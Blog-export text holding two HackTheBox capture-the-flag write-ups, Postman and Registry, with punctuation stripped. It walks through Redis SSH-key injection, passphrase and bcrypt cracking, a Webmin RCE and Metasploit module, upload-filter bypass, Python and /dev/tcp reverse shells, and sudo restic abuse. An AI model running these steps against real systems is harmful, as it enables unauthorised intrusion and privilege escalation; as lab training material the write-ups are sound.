functionhttpstwittercomhg8status1162694712177954819 But I couldnt get anything to work nor making progress any progress A piece of the puzzle looked missing to me When this happen I like to restart my recon process from the beginning to make sure I didnt forgot anything Lets start by rerunning nmap but this time on the top 10000 ports bash hg8archbook nmap sV sT sC topports 10000 postmanhtb Starting Nmap 780 httpsnmaporg at 20191222 2039 CET Nmap scan report for postmanhtb 101010160 Host is up 0035s latency Not shown 8316 closed ports PORT STATE SERVICE VERSION 22tcp open ssh OpenSSH 76p1 Ubuntu 4ubuntu03 Ubuntu Linux protocol 20 80tcp open http Apache httpd 2429 Ubuntu httptitle The Cyber Geeks Personal Website 6379tcp open redis Redis keyvalue store 409 10000tcp open http MiniServ 1910 Webmin httpd httptitle Site doesnt have a title texthtml Charsetiso88591 Service Info OS Linux CPE cpeolinuxlinuxkernel Nmap done 1 IP address 1 host up scanned in 15041 seconds Aah thats interesting A new service appeared A redis instance running on port 6379 Thats probably the missing piece of our puzzle Being new to redis I spent a bit of time reading articles and documentations on redis before starting anything During my research I stumbled upon this very interesting article A few things about Redis securityhttpantirezcomnews96 The article written by one of the redis dev explain how to crack Redis for fun and no profit on exposed redis instance with no authentication activated Maybe its our case First lets check if the redis instance need authentication bash hg8archbook telnet postmanhtb 6379 Trying 101010160 Connected to postmanhtb Escape character is echo Hey no AUTH required 21 Hey no AUTH required quit OK Connection closed by foreign host Well indeed not auth is needed to access this redis instance thats good news Lets follow the article to see if we can exploit it the same way the author present in his article The next step described in the article is to write our own SSH Public key into sshauthorizedkeys in order to gain access to the server First step is to generate a ssh key pair that we will add to the authorizedkeys of the server bash hg8archbook sshkeygen t rsa C hg8hg8hg8 Generating publicprivate rsa key pair Enter file in which to save the key homehg8sshidrsa idrsa Enter passphrase empty for no passphrase Enter same passphrase again Your identification has been saved in idrsa Your public key has been saved in idrsapub The key fingerprint is f0a152e90d5fe4d935337343b4c8b927 hg8hg8hg8 The keys randomart image is RSA 2048 O o ooo o B o o S E o I quote the author on this part since he explains way better than me Now Ive a key My goal is to put it into the Redis server memory and later to transfer it into a file in a way that the resulting authorizedkeys file is still a valid one Using the RDB format to do this has the problem that the output will be binary and may in theory also compress strings But well maybe this is not a problem To start lets pad the public SSH key I generated with newlines before and after the content bash hg8archbook echo e nn cat idrsapub echo e nn idrsawithnlpub Now that we have all the pieces lets add our ssh key to the authorizedkeys file bash hg8archbook rediscli h 101010160 echo flushall flushall hg8archbook cat idrsawithnlpub rediscli h 101010160 x set crackit OK hg8archbook rediscli h 101010160 config set dir varlibredisssh OK hg8archbook rediscli h 101010160 config set dbfilename authorizedkeys OK hg8archbook rediscli h 101010160 save OK Then lets try to login using this generated ssh key bash hg8archbook ssh i idrsa redispostmanhtb Welcome to Ubuntu 18043 LTS GNULinux 415058generic x8664 Documentation httpshelpubuntucom Management httpslandscapecanonicalcom Support httpsubuntucomadvantage Canonical Livepatch is available for installation Reduce system reboots and improve kernel security Activate at httpsubuntucomlivepatch Last login Mon Aug 26 030425 2019 from 1010101 redisPostman Pivot Redis Matt Ok now we have access to the machine with redis user lets now find the user to pivot to bash redisPostman ls l homeMatt total 4 rwrw 1 Matt Matt 33 Aug 26 0307 usertxt Matt is our user Lets do a bit more of recon to see if we can find additional informations While searching around we find an interesting backup file bash redisPostman cat optidrsabak BEGIN RSA PRIVATE KEY ProcType 4ENCRYPTED DEKInfo DESEDE3CBC73E9CEFBCCF5287C JehA51I17rsCOOVqyWxC8363IOBYXQ11Ddwpr3L2A2NDtB7tvsXNyqKDghfQnX cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2 7GsTwsMvKzXkkfEZQaXKT50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4KySjp4ou6 cdnCWhzkATwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9 1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv EyvlWwks7RgjxHyUwTa5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP UH7OfQz03VWyK0aa8QsEyw6X3wbWnue03ngsLJnJ729zb3kuym8rhU9v6VY SjQnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFTxIhxEAiv0m1ZkkyQkWpUiCzyuYK tMStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YNOBoPPOTaBVD9i6fsoZ6pwnS 5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7McQECb5sfO6 jKE3Jfn0UVE2QVdVK3oEL6DyaBfW2d3T7q10Ud7K4Kd36gxMBf33Ea6qx3Ge SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJvFZC5YIsQ9sl89TmJHL74Y3i l3YXDEsQjhZHxX5XRU02DAF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X 0VIWrskPK4I7IH5gbkrxVGb9gW2ua1C3Nncv3MNcf0nlI117BSQwNtuTozG8p S9k3lirYr6f3maULsUnKiZls8SpURsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR hkuzUuH9zmBo2tQWh8qvToCSEjg8yNO9z8LdoN1wQWMPaVwRBjIyxCPHFTJ3u Zxy0tIPwjCZvxUfYnK4FVHavvAb9lopnUCEAERpwIv8tYofwGVpLVC0DrN58V XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWfq7MGrO3cF25k1PEWNyZMqY4WYsZXi WhQFHkFOINwVEOtHakZToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh KTkmhKMTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2oNgq92Hm npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHqh5CQwsFJRg88bnxh2z2BD6i5W XhK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw END RSA PRIVATE KEY A private RSA key we can probably use it to connect to matt account using SSH Lets pull this key to work on it offline bash hg8archbook scp i idrsa redispostmanhtboptidrsabak idrsabak 100 1743 481KBs 0000 First thing to try login through SSH on Matts account with this key bash hg8archbook chmod 600 idrsabak hg8archbook ssh i idrsabak Mattpostmanhtb Enter passphrase for key idrsabak Of course a passphare is needed Maybe we can bruteforce it Calling john to the rescue bash hg8archbook ssh2john idrsabak idrsahash hg8archbook john wordlistSecListsPasswordsLeakedDatabasesrockyoutxt idrsahash Loaded 1 password hash SSH RSADSAECOPENSSH SSH private keys 3264 Will run 2 OpenMP threads Press q or CtrlC to abort almost any other key for status computer2008 idrsabak 1g 0000012 DONE 20191222 2116 008264gs 1185Kps 1185Kcs 1185KCs 7Vamos Session completed Good we got a passphrase here Lets try to login again bash hg8archbook ssh i idrsabak Mattpostmanhtb Enter passphrase for key idrsabak Connection closed by 101010160 port 22 We immediately get aConnection closed error message upon connexion Seems like we have the right ssh key the right passphare but the ssh config forbid Matt to connect Lets confirm those doubts bash redisPostman cat etcsshsshdconfig deny users DenyUsers Matt Alright so Matt is not allowed to SSH we need to find another way to access his account If Matt reuse password we should be able switch to Matt from Redis user using su bash redisPostman su Matt Password MattPostman cat usertxt 51xxxxxxxxxxxxxxxxxxxxxx3c Root Flag Recon Now that we have access to our user lets make a bit of recon to see if we can escalate our privileges to root After a while we can not find anything worthy onto Matt account Once again when being stuck lets go back at beginning to make sure we dont forget anything Remember that Webmin instance It must be there for a reason Knowing that Matt reuse his password maybe we can be able to connect to Webmin using the same credentials Mattcomputer2008 Lets try to login postman webmin loginhttpsuserimagesgithubusercontentcom907674771327015402c5c00250311ea871c0a5321984f47png Success We are in From this control panel we can not access a lot Only the Software Package Updates page We can not seem to do anything interesting from there Knowing from the nmap result and the page footer the Webmin version is 1910 lets see if some exploit have been published bash hg8archbook searchsploit webmin Exploit Title Path usrshareexploitdb DansGuardian Webmin Module 0x editcgi Directory Trav exploitscgiwebapps23535txt Webmin Brute Force Command Execution exploitsmultipleremote705pl Webmin 09x Usermin 09x10 Access Session ID Spoofin exploitslinuxremote22275pl Webmin 0x RPC Privilege Escalation exploitslinuxremote21765pl Webmin 0x Code Input Validation exploitslinuxlocal21348txt Webmin 15 Brute Force Command Execution exploitsmultipleremote746pl Webmin 15 Web Brute Force CGI exploitsmultipleremote745pl Webmin 1580 fileshowcgi Remote Command Execution exploitsunixremote21851rb Webmin 1850 Multiple Vulnerabilities exploitscgiwebapps42989txt Webmin 1900 Remote Command Execution Metasploit exploitscgiremote46201rb Webmin 1910 Package Updates Remote Command Execution exploitslinuxremote46984rb Webmin 1920 Remote Code Execution exploitslinuxwebapps47293sh Webmin 1920 Unauthenticated Remote Code Execution Meta exploitslinuxremote47230rb Webmin 1x HTML Email Command Execution exploitscgiwebapps24574txt Webmin 1290 Usermin 1220 Arbitrary File Disclosu exploitsmultipleremote1997php Webmin 1290 Usermin devtcp101010108585 01 Attempting to login Exploiting Executing payload Aaaand a new connection open on our listener bash hg8archbook nc l vv p 8585 Listening on any address 8585 Connection from 10101016054474 rootPostmanusrsharewebminpackageupdates cd rootPostman cat roottxt a2xxxxxxxxxxxxxxxxxxxxxce Additional information For the CVE201912840 Metasploit could have been used the following way bash hg8archbook msfconsole msf5 use exploitlinuxhttpwebminpackageuprce msf5 exploitlinuxhttpwebminpackageuprce show options Module options exploitlinuxhttpwebminpackageuprce Name Current Setting Required Description PASSWORD yes Webmin Password Proxies no A proxy chain of format typehostporttypehostport RHOSTS yes The target hosts range CIDR identifier or hosts file with syntax file RPORT 10000 yes The target port TCP SSL false no Negotiate SSLTLS for outgoing connections TARGETURI yes Base path for Webmin application USERNAME yes Webmin Username VHOST no HTTP server virtual host Payload options cmdunixreverseperl Name Current Setting Required Description LHOST yes The listen address an interface may be specified LPORT 4444 yes The listen port Exploit target Id Name 0 Webmin set RHOSTS 101010160 RHOSTS 101010160 msf5 exploitlinuxhttpwebminpackageuprce set LHOST 10101010 LHOST 101010160 msf5 exploitlinuxhttpwebminpackageuprce set username Matt username Matt msf5 exploitlinuxhttpwebminpackageuprce set password computer2008 password computer2008 msf5 exploitlinuxhttpwebminpackageuprce set payload cmdunixreversepython payload cmdunixreversepython msf5 exploitlinuxhttpwebminpackageuprce set SSL true SSL true msf5 exploitlinuxhttpwebminpackageuprce options Module options exploitlinuxhttpwebminpackageuprce Name Current Setting Required Description PASSWORD computer2008 yes Webmin Password Proxies no A proxy chain of format typehostporttypehostport RHOSTS 101010160 yes The target hosts range CIDR identifier or hosts file with syntax file RPORT 10000 yes The target port TCP SSL true no Negotiate SSLTLS for outgoing connections TARGETURI yes Base path for Webmin application USERNAME Matt yes Webmin Username VHOST no HTTP server virtual host Payload options cmdunixreversepython Name Current Setting Required Description LHOST 101015123 yes The listen address an interface may be specified LPORT 8585 yes The listen port SHELL binbash yes The system shell to use msf5 exploitlinuxhttpwebminpackageuprce check NICE Matt has the right to Package Update run Started reverse TCP handler on 101010108585 Session cookie 0712c463a268f71262aa809eb4f41928 Attempting to execute the payload Command shell session 1 opened 101010108585 10101016038146 at 20191105 020759 0100 id uid0root gid0root groups0root cat rootroottxt a2xxxxxxxxxxxxxxxxxxxxxce Thats it folks As always do not hesitate to contact me for any questions or feedbacks See you next time hg8"},{"title":"Registry - HackTheBox","tags":["hackthebox","ctf","registry","docker","docker-registry","php","shell_exec","webshell","enumeration","sudo","restic"],"href":"/posts/registry","content":"Registry was my first hard box this box was pretty interesting with reallife scenario like I love This box shows the importance of understanding how things works behind the scene and to read all documentations carefully to not miss anything I recommend this box for people who finished few medium difficulty boxes and wants to levelup TlDr The user flag consisted in finding an INSTALL archive containing install instruction and certificate to deploy an online docker registry this certificate was used on the docker registry running on the box Using this cert we could connect to the registry API and pull the docker image available on it Running the docker image locally and doing recon into it allows to find an SSH key along with its passphrase This key would allow to connect to the bolt user account and grab the user flag The root flag required to access a CMS after bruteforcing the admin password found in a sqlite database From the CMS we pivot from the bolt user to wwwdata user by exploiting insecure file upload vulnerability From wwwdata a backup software restic can be run as sudo without password Using this software we are able to backup the whole root folder and restore its content with read privileges for wwwdata including the roottxt flag and a sshidrsa key allowing us to get a full shell as root Alright Lets get into the details now First thing first lets add the box IP to the host file bash hg8archbook echo 101010171 registryhtb etchosts and lets start User Flag Recon Lets start with the classic nmap scan to see which ports are open on the box bash hg8archbook nmap sV sT sC registryhtb Starting Nmap 780 httpsnmaporg at 20200127 1058 CET PORT STATE SERVICE VERSION 22tcp open ssh OpenSSH 76p1 Ubuntu 4ubuntu03 Ubuntu Linux protocol 20 80tcp open http nginx 1140 Ubuntu httpserverheader nginx1140 Ubuntu httptitle Welcome to nginx 443tcp open sslhttp nginx 1140 Ubuntu httpserverheader nginx1140 Ubuntu httptitle Welcome to nginx sslcert Subject commonNamedockerregistryhtb Not valid before 20190506T211435 Not valid after 20290503T211435 Service Info OS Linux CPE cpeolinuxlinuxkernel Port 80 443 and 22 are open One interesting point the SSL certificate have dockerregistryhtb as common Name Lets add it to our host file as it can be useful later bash hg8archbook echo 101010159 dockerregistryhtb etchosts Opening httpregirstryhtb display the default nginx page default nginx pagehttpsuserimagesgithubusercontentcom907674773365373756b5d0042ac11ea8134e63c52f73b34png While httpdockerregistryhtb return empty response http hg8archbook curl i httpdockerregistryhtb HTTP11 200 OK Server nginx1140 Ubuntu ContentLength 0 Connection keepalive CacheControl nocache StrictTransportSecurity maxage63072000 includeSubdomains XFrameOptions DENY XContentTypeOptions nosniff Thats not much informations here Lets run gobuster to see if we can find more interesting stuff bash hg8archbook gobuster dir u httpsregistryhtb w SecListsDiscoveryWebContentbigtxt x php k Gobuster v301 by OJ Reeves TheColonial Christian Mehlmauer FireFart bashhistory Status 403 htpasswd Status 403 htaccess Status 403 install Status 301 backupphp 20200129 154358 Finished The backup endpoint must be used as a script to dowellbackups It doesnt return anything either bash hg8archbook curl i registryhtbbackupphp HTTP11 200 OK Server nginx1140 Ubuntu Date Fri 07 Feb 2020 143330 GMT ContentType texthtml charsetUTF8 TransferEncoding chunked Connection keepalive StrictTransportSecurity maxage63072000 includeSubdomains XFrameOptions DENY XContentTypeOptions nosniff Next opening the install endpoint shows some garbage install file garbagehttpsuserimagesgithubusercontentcom907674773366783ced48b8042ae11ea8ad03583a3cacacfpng Since we dont have other endpoint so far lets investigate a bit more on this last one First lets download this page to file bash hg8archbook wget httpregistryhtbinstall Saving to install 20200129 155407 533 MBs install saved 1050 hg8archbook file install install gzip compressed data last modified Mon Jul 29 233820 2019 from Unix original size modulo 232 167772200 gzip compressed data reserved method has CRC was from FAT filesystem MSDOS OS2 NT original size modulo 232 167772200 Thats interesting the file utility indicate that the install file is a gzip archive Lets try to extract it Out of habit I used tar bash hg8archbook tar xzf install gzip stdin unexpected end of file tar Child returned status 1 tar Error is not recoverable exiting now Despite this bad looking error the files seems to have been extracted properly so thats good bash hg8archbook ls a cacrt install readmemd Note Another way to access archive content when the archive seems corrupted it to use zcat bash hg8archbook zcat install cacrt0000775000004100000410000000210613464123607012215 0ustar wwwdatawwwdataBEGIN CERTIFICATE MIICDCCAeSgAwIBAgIJAIFtFmFVTwEtMA0GCSqGSIb3DQEBCwUAMBMxETAPBgNV QMPjq1S5SqXJqzop4OnthgWlwggSe6z8ZTuDjdNIpx0tF77arh2rUOIXKIerx5B END CERTIFICATE readmemd0000775000004100000410000000020113472260460012667 0ustar wwwdatawwwdata Private Docker Registry httpsdocsdockercomregistrydeploying httpsdocsdockercomenginesecuritycertificates gzip install unexpected end of file So we got two files unzipped a certificate cacrt and a readme file readmemd bash hg8archbook cat cacrt BEGIN CERTIFICATE MIICDCCAeSgAwIBAgIJAIFtFmFVTwEtMA0GCSqGSIb3DQEBCwUAMBMxETAPBgNV QMPjq1S5SqXJqzop4OnthgWlwggSe6z8ZTuDjdNIpx0tF77arh2rUOIXKIerx5B END CERTIFICATE hg8archbook cat readmemd Private Docker Registry httpsdocsdockercomregistrydeploying httpsdocsdockercomenginesecuritycertificates The readme links to two pieces of documentation 1 Deployment of a private docker registry 2 Verifying repository client with certificates These documentation make sense of what we found so far dockerregistryhtb is probably the API of a private docker registry while the cacrt might be used to connect to the registry securely Docker Registry Now that we have an idea of whats going on dockerregistryhtb lets make a bit of recon to see what we can do with this instance First lets run gobuster to see if we can find useful endpoints bash hg8archbook gobuster dir u httpsdockerregistryhtb w SecListsDiscoveryWebContentbigtxt x php k Gobuster v301 by OJ Reeves TheColonial Christian Mehlmauer FireFart v2 Status 301 20200127 111110 Finished This v2 endpoint confirms we are looking at an API Lets continue bash hg8archbook curl i dockerregistryhtbv2 HTTP11 401 Unauthorized Server nginx1140 Ubuntu ContentType applicationjson charsetutf8 ContentLength 87 Connection keepalive DockerDistributionApiVersion registry20 WwwAuthenticate Basic realmRegistry XContentTypeOptions nosniff errorscodeUNAUTHORIZEDmessageauthentication requireddetailnull Searching for this error redirect us to the valuable Docker Registry API documentationhttpsdocsdockercomregistryspecapi which will probably be super useful soon If a 401 Unauthorized response is returned the client should take action based on the contents of the WWWAuthenticate header and try the endpoint again Depending on access control setup the client may still have to authenticate against different resources even if this check succeeds WwwAuthenticate that got returned to us indicate we have to authenticate through a Basic authentication method We didnt find any username or password yet so lets try the classic adminadmin bash hg8archbook curl i u adminadmin dockerregistryhtbv2 HTTP11 200 OK Server nginx1140 Ubuntu ContentType applicationjson charsetutf8 ContentLength 2 Connection keepalive DockerDistributionApiVersion registry20 XContentTypeOptions nosniff StrictTransportSecurity maxage63072000 includeSubdomains XFrameOptions DENY XContentTypeOptions nosniff Alright We have access to the Docker API Registry the next logical step is to see if any docker image is stored on this registry According to the documentation we can do so using the catalog endpoint Images are stored in collections known as a repository which is keyed by a name as seen throughout the API specification A registry instance may contain several repositories The list of available repositories is made available through the catalog bash hg8archbook curl u adminadmin httpdockerregistryhtbv2catalog repositoriesboltimage Great there is indeed an image lets pull it to investigate its content bash hg8archbook docker pull dockerregistryhtbboltimage Using default tag latest Error response from daemon Get httpsdockerregistryhtbv2 x509 certificate signed by unknown authority New error certificate error Remember we found a documentation link and a certificate in the install archive Lets take a look the solution is surely inside A custom certificate is configured by creating a directory under etcdockercertsd using the same name as the registrys hostname such as localhost All crt files are added to this directory as CA roots Lets do this with the certificate we got in install archive bash hg8archbook sudo mkdir p etcdockercertsddockerregistryhtb hg8archbook sudo mv cacrt etcdockercertsddockerregistryhtbcacrt hg8archbook docker pull dockerregistryhtbboltimage Using default tag latest Error response from daemon Get httpsdockerregistryhtbv2boltimagemanifestslatest no basic auth credentials We are getting closer Lets login to the docker using the adminadmin credentials bash hg8archbook docker login u admin p admin httpdockerregistryhtb WARNING Using password via the CLI is insecure Use passwordstdin WARNING Your password will be stored unencrypted in homehg8dockerconfigjson Configure a credential helper to remove this warning See httpsdocsdockercomenginereferencecommandlinelogincredentialsstore Login Succeeded Everything should now be in order lets pull this damn image bash hg8archbook docker pull dockerregistryhtbboltimage Using default tag latest latest Pulling from boltimage f476d66f5408 Pull complete 302bfcb3f10c Pull complete Digest sha256eeff225e5fae33dc832c3f82fd8b0db363a73eac4f0f0cb587094be54050539b Status Downloaded newer image for dockerregistryhtbboltimagelatest dockerregistryhtbboltimagelatest hg8archbook docker images REPOSITORY TAG IMAGE ID CREATED SIZE dockerregistryhtbboltimage latest 601499e98a60 8 months ago 362MB Looks all good now We pulled the image and it can be ran locally We can now start it and get a shell inside so we can recon for interesting files bash hg8archbook docker run it 601499e98a60 binbash root6467ad831f74 cd root root6467ad831f74 ls la total 28 drwx 1 root root 4096 Jan 27 1314 drwxrxrx 1 root root 4096 Jan 27 1308 lrwxrwxrwx 1 root root 9 May 25 2019 bashhistory devnull rwrr 1 root root 3106 Apr 9 2018 bashrc rwrr 1 root root 148 May 25 2019 profile drwxrxrx 2 root root 4096 May 25 2019 ssh rw 1 root root 1061 May 25 2019 viminfo rwrr 1 root root 215 Jan 27 1314 wgethsts root19e33fc3a2fa ls a ssh config idrsa idrsapub knownhosts root19e33fc3a2fa cat sshconfig Host registry User bolt Port 22 Hostname registryhtb root19e33fc3a2fa cat sshidrsa BEGIN RSA PRIVATE KEY ProcType 4ENCRYPTED DEKInfo AES128CBC1C98FA248505F287CCC597A59CF83AB9 KF9YHXRjDZ35Q9ybzkhcUNKF8DSZaNLYXPL3kgdqlUqwfpqpbVdHbMeDk7qbS7w 94Vcvj5Kmzv0FxwVu4epWNkLTZCJPBszTKiaEWWSOLDh7lrcmmGP54MsLBWVpr END RSA PRIVATE KEY We have anssh folder with private key and a username bolt for registryhtb host Looks a little too easy but lets give a try bash hg8archbook ssh i idrsa boltregistryhtb Enter passphrase for key idrsa Of course it was too easy the key need a passphrase and we didnt find any yet In these situations I usually try to run john to quickly bruteforce the passphrase bash hg8archbook ssh2john idrsa idrsahash hg8archbook john wordlistSecListsPasswordsLeakedDatabasesrockyoutxt idrsahash Loaded 1 password hash SSH RSADSAECOPENSSH SSH private keys 3264 Press q or CtrlC to abort almost any other key for status 0g 0000018 DONE 20200131 1529 0gs 792796ps 792796cs 792796Cs Session completed No luck here To be honest it took me too much time to find this passphrase but as usual recon is always the key to progress and finally bash root02c3e9ee87d2 grep ri passphrase 2devnull etcprofiled01sshshexpect Enter passphrase for rootsshidrsa root02c3e9ee87d2 cat etcprofiled01sshsh usrbinexpect f eval sshagent s spawn sshadd rootsshidrsa expect Enter passphrase for rootsshidrsa send GkOcz221Ftb3ugogn expect Identity added rootsshidrsa rootsshidrsa interact sshadd is a command for adding SSH private keys into the SSH authentication agent for implementing single signon with SSH As a reminder etcprofile The systemwide initialization file executed for login shells When looking in the etcprofile we can see that all scripts in etcprofiled are executed on login time bash root02c3e9ee87d2 cat etcprofile if d etcprofiled then for i in etcprofiledsh do if r i then i fi done unset i fi We now understand why this sshadd command is made on login the combination of sshagent and sshadd allow the user to connect to any server he is allowed to access without having to type in a password every time when moving between servers Well now that we have all the needed informations lets try to login to SSH again bash hg8archbook ssh i idrsa boltregistryhtb Enter passphrase for key idrsa Welcome to Ubuntu 18043 LTS GNULinux 415065generic x8664 System information as of Mon Jan 27 144239 UTC 2020 System load 002 Users logged in 0 Usage of 56 of 6180GB IP address for eth0 101010159 Memory usage 21 IP address for br1bad9bd75d17 1721801 Swap usage 0 IP address for docker0 1721701 Processes 154 Last login Mon Oct 21 103148 2019 from 1010142 boltbolt ls usertxt boltbolt cat usertxt yxxxxxxxxxxxxxxxxxxxxxxxxxi Root Flag Alright Now that we have access to bolt account Its time to escalate it to root Recon The usual quick recon shows that bolt user doesnt seems to hold anything very valuable Lets investigate the varwwwhtml directory to take a look at this backupphp file we found during the user recon phase bash boltbolt cat varwwwbackupphp wwwdata While looking in the varwwwhtml directory we find a bolt folder This one was missed by gobuster during our recon phase So whats this bolt Opening httpsregistryhtbbolt display an empty sample website bolt sample websitehttpsuserimagesgithubusercontentcom907674775478718ba171080599e11ea8a71450c96466f93png A quick Google search gives us additional information about what Bolt is Bolt is a free opensource content management system based on PHP It was released in 2012 and developed by Two Kings and the Bolt community Bolt uses Twig for templates and includes features for content and user management Boltcmhttpsboltcm I will add it to my usual recon list to make sure not missing it next time bash hg8archbook echo bolt SecListsDiscoveryWebContentbigtxt Reading through the documentation we can see that the admin interface is available at httpsregistryhtbboltbolt bolt admin pagehttpsuserimagesgithubusercontentcom9076747754789942134c500599f11ea8b4009e1489b3d57png No common password combination seems to work here No need to loose time bruteforcing since we have access the app code source through the bolt ssh user account lets dig a bit there to see if we can find any interesting config files Looking around we quickly stumble across bolt sqli database in varwwwhtmlboltdatabaseboltdb Lets take a look inside for juicy information bash hg8archbook sqlite3 boltdb SQLite version 3301 20191010 201945 Enter help for usage hints sqlite tables boltauthtoken boltfieldvalue boltpages boltusers boltblocks bolthomepage boltrelations boltcron boltlogchange boltshowcases boltentries boltlogsystem bolttaxonomy sqlite SELECT FROM boltusers 1admin2y10eChUytg9SrL7AsboF2bXwWKQ1LkS5Fi3Z0yYD86P5E9cpY7PKboltregistryhtb20191017 1434521010142Adminfilesshellphp10rooteveryone sqlite The first thing that catch the attention is this boltusers table Inside we grab the password hash of user Admin Lets try to crack it using john bash hg8archbook john wordlistSecListsPasswordsLeakedDatabasesrockyoutxt adminhash Warning detected hash type bcrypt but the string is also recognized as bcryptopencl Use the formatbcryptopencl option to force loading these as that type instead Using default input encoding UTF8 Loaded 1 password hash bcrypt Blowfish 3264 X3 Cost 1 iteration count is 1024 for all loaded hashes Will run 2 OpenMP threads Press q or CtrlC to abort almost any other key for status strawberry 1g 0000009 DONE 20200127 1603 01072gs 3669ps 3669cs 3669Cs strawberryihateyou Use the show option to display all of the cracked passwords reliably Session completed Bingo So we got Adminstrawberry using those credentials in the admin login page works bolt admin dashboardhttpsuserimagesgithubusercontentcom9076747754798758e95258059a011ea9bb054ca89137950png Looking around at the various settings we quickly come across the File Management setting allowing us to upload file to the server Sounds good to upload a web shell dont you think First thing to try is to send a php file to see if we can execute php on the server bash echo testphp Unfortunately when trying to upload we receive the following error message bolt upload failurehttpsuserimagesgithubusercontentcom907674775480049e207738059a011ea9eecd5a3d1555d77png No php allowed At this point I tried various way to bypass the file upload restrictions Changing extension testPHp testphp7 since server runs PHP7 Contenttype bypass Double extension testphpjpg testjpgphp Null Character testphp00jpg Using GIF89a header But didnt managed to get any of this to work Searching a bit farther we discover that its possible to change the allowed extension list in ConfigurationMain Configuration Even though a comment state php extension are never acceptable adding it to the list seems to work and let us upload php file yaml Note that certain filetypes are never acceptable even if they are in this list These types are never allowed sh asp cgi php php3 ph3 php4 ph4 php5 ph5 phtm phtml acceptfiletypes php twig html js css scss gif jpg jpeg png ico zip tgz txt md doc docx pdf epub xls xlsx ppt pptx mp3 ogg wav m4a mp4 m4v ogv wmv avi webm svg bolt php file uploadhttpsuserimagesgithubusercontentcom9076747754815608c80960059a311ea8b0a7a2c2c7f88ecpng The php file is now accessible at httpsregistryhtbboltfileshg8php bolt php file uploadhttpsuserimagesgithubusercontentcom907674775481639aae6918059a311ea815475163f358616png Good we are on the right track to upload a web shell Unfortunately its not that simple the uploaded files gets deleted and configuration file reset every 1 minute or so making it impossible to use a web shell The good news is we do have an access to the server on ssh as bolt user here is how we can proceed to get a stable shell 1 Create a reverse shell script with the bolt account on the server tmp folder 2 Upload a php file executing this script This way we get a reverse that will be executed as wwwdata and will stay up even after the php file gets deleted Here is one way to do so First lets create the reverse shell script I will use Python one bash boltbolt cat tmphg8py python c import socketsubprocessosssocketsocketsocketAFINETsocketSOCKSTREAMsconnect101010108585osdup2sfileno0 osdup2sfileno1 osdup2sfileno2psubprocesscallbinshi boltbolt which python usrbinpython Now our php file calling this hg8py reverse shell bash hg8archbook echo hg8php Finally lets open our listener bash hg8archbook nc l vv p 8585 Listening on any address 8585 And lets redo the process edit the configuration to allow php upload upload the hg8php file and open it If everything goes fine and you have been fast enough the connection will open But it doesnt The connection just seem to hang The first thing that comes to mind is that a firewall is blocking any connection from outside Since we have an access on the machine lets try to open our listener here instead bash boltbolt nc l vv p 8585 Listening on 0000 family 0 port 8585 Lets now recreate our python reverse shell with registry IP reupload and run our hg8php and bash boltbolt nc l vv p 8585 Listening on 0000 family 0 port 8585 Connection from localhost 48396 received id uid33wwwdata gid33wwwdata groups33wwwdata Alright we now have access to wwwdata account Thats a good progress Lets now try to find if and how we could escalate to root privilege While doing the usual recon for privilege escalation we stumble across the backup command we have seem before bash boltbolt sudo l Matching Defaults entries for wwwdata on bolt envreset exemptgroupsudo mailbadpass securepathusrlocalsbinusrlocalbinusrsbinusrbinsbinbinsnapbin User wwwdata may run the following commands on bolt root NOPASSWD usrbinrestic backup r rest Its the restic command we saw in the varwwwhtmlbackupphp file bash boltboltvarwwwhtml cat varwwwhtmlbackupphp restic is a backup program that is fast efficient and secure It supports the three major operating systems httpsresticnet So we have a program that can be run as root manipulating files we can control Sounds like a perfect scenario for privilege escalation Lets break down the restic command from backupphp to understand exactly whats its doing bash boltbolt restic help backup Create a new backup of files andor directories boltbolt restic backup help r repo string repository to backup to or restore from default RESTICREPOSITORY Alright so if we take this command as example bash restic backup r resthttpbackupregistryhtbbolt bolt restic is going to back up the bolt folder to the distant repository available at httpbackupregistryhtb Looking around it seems we can not access nor do anything at httpbackupregistryhtb But anyway what lays there According to the restic documentation its the url of a restic remote repository Reading a bit more we can find a tool resticrestserverhttpsgithubcomresticrestserver to create those remote repositories Rest Server is a high performance HTTP server that implements restics REST backend API It provides secure and efficient way to backup data remotely using restic backup client via the rest URL httpsresticreadthedocsioenlatest030preparinganewrepohtmlrestserver Seeing this we can understand its what is being used on httpbackupregistryhtb With all those information in mind we start to understand how we could read files with escalated privileges 1 Setup a local restic backup server 2 Use the following command that wwwdata can run as sudo without password bash usrbinrestic backup r resthttpourresticrepolocal root 3 Navigate to the root folder that restic backup to grab the flag Its not yet a root shell but it should be good enough to grab the roottxt flag Alright so that was the idea lets see in practice now Restic privileged file read First thing first lets build the restic restserver binary bash hg8archbook git clone httpsgithubcomresticrestservergit cd restserver hg8archbook go run buildgo Lets now push the binary to the server bash hg8archbook scp i idrsa restserver boltregistryhtbtmp We can now check the documentation to understand how to run it bash boltbolttmp restserver help Run a REST server for use with restic Usage restserver flags Flags appendonly enable append only mode cpuprofile string write CPU profile to file debug output debug messages h help help for restserver listen string listen address default 8000 log string log HTTP requests in the combined log format noauth disable htpasswd authentication path string data directory 